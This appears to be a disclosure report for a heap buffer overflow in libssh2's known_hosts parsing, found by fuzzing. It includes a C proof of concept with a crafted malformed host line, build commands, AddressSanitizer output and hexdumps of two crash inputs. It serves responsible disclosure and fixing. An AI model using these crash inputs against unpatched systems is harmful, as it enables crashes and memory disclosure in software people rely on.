<b>Tested on commit:</b> 714fa87

## Summary

I've successfully created a libFuzzer harness targeting the `libssh2_knownhost_readline()` API, used for parsing SSH known_hosts files. The fuzzer discovered a heap buffer overflow vulnerability in the `_libssh2_base64_encode()` function when processing malformed hashed hostname entries.

<b>minimal_poc.c:</b>

```C
#include <stdio.h>
#include <string.h>
#include "libssh2.h"

int main() {

    const char *evil = "|1||||||| ssh-h-\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13rsA= #";
    
    libssh2_init(0);
    LIBSSH2_SESSION *session = libssh2_session_init();
    LIBSSH2_KNOWNHOSTS *hosts = libssh2_knownhost_init(session);
    
    libssh2_knownhost_readline(hosts, evil, strlen(evil), LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    
    struct libssh2_knownhost *store, *prev = NULL;
    char buf[4096];
    size_t len;
    if (libssh2_knownhost_get(hosts, &store, prev) == 0) {
        libssh2_knownhost_writeline(hosts, store, buf, sizeof(buf), &len, LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    }
    
    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
```


<b>Compile:</b>

```
clang -g -fsanitize=address -I./include -I./src -DLIBSSH2_OPENSSL -I/usr/local/opt/openssl@3/include minimal_poc.c ./src/.libs/libssh2.a -L/usr/local/opt/openssl@3/lib -lcrypto -lssl -lz -o minimal_poc
```

<b>ASAN:</b>

```
bash-3.2$ ./minimal_poc
minimal_poc(41411,0x7ff84b5d2f80) malloc: nano zone abandoned due to inability to reserve vm space.
=================================================================
==41411==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000000d5 at pc 0x00010728cb0f bp 0x7ff7b9a37f90 sp 0x7ff7b9a37758
READ of size 6 at 0x6020000000d5 thread T0
    #0 0x00010728cb0e in strlen+0x80e (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x19b0e)
    #1 0x0001064d808e in _libssh2_base64_encode misc.c:463
    #2 0x0001064d72d3 in knownhost_writeline knownhost.c:1108
    #3 0x0001064c6b10 in main minimal_poc.c:21
    #4 0x7ff80983352f in start+0xbef (dyld:x86_64+0xfffffffffffde52f)

0x6020000000d5 is located 0 bytes after 5-byte region [0x6020000000d0,0x6020000000d5)
allocated by thread T0 here:
    #0 0x0001073554d2 in malloc+0x82 (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0xe24d2)
    #1 0x0001064d7f0c in _libssh2_base64_decode misc.c:395
    #2 0x0001064d606f in knownhost_add knownhost.c:174
    #3 0x0001064d6fa1 in hostline knownhost.c:851
    #4 0x0001064c6aae in main minimal_poc.c:14
    #5 0x7ff80983352f in start+0xbef (dyld:x86_64+0xfffffffffffde52f)

SUMMARY: AddressSanitizer: heap-buffer-overflow misc.c:463 in _libssh2_base64_encode
Shadow bytes around the buggy address:
  0x601ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x601fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x602000000000: fa fa fd fa fa fa fd fd fa fa 00 00 fa fa 00 04
=>0x602000000080: fa fa 00 04 fa fa 00 00 fa fa[05]fa fa fa 01 fa
  0x602000000100: fa fa 02 fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==41411==ABORTING
Abort trap: 6
bash-3.2$
```

<b>Crash:</b>

```
bash-3.2$ hexdump -C ./crash-47ae4ab289208f01fa5c170cf038b6b3420136cb 
00000000  7c 31 7c 7c 7c 7c 7c 7c  7c 20 73 73 68 2d 68 2d  ||1||||||| ssh-h-|
00000010  13 13 13 13 13 13 13 13  13 13 13 13 13 13 13 13  |................|
00000020  13 13 13 13 13 13 13 13  13 13 13 72 73 41 3d 20  |...........rsA= |
00000030  23                                                |#|
00000031
bash-3.2$ 
bash-3.2$ hexdump -C crash-d72f40d5cd95987a058ece287de07373ae7e1c23
00000000  7c 31 7c 7c 7c 7c 7c 7c  7c 20 73 73 68 2c 72 73  ||1||||||| ssh,rs|
00000010  61 20 41 3d 40 ff ff ff  ff ff ff ff ff ff ff ff  |a A=@...........|
00000020  ff ff ff ff ff ff ff ff  ff ff ff 20 23           |........... #|
0000002d
bash-3.2$ 
```

**Reference:** https://github.com/libssh2/libssh2/pull/1641
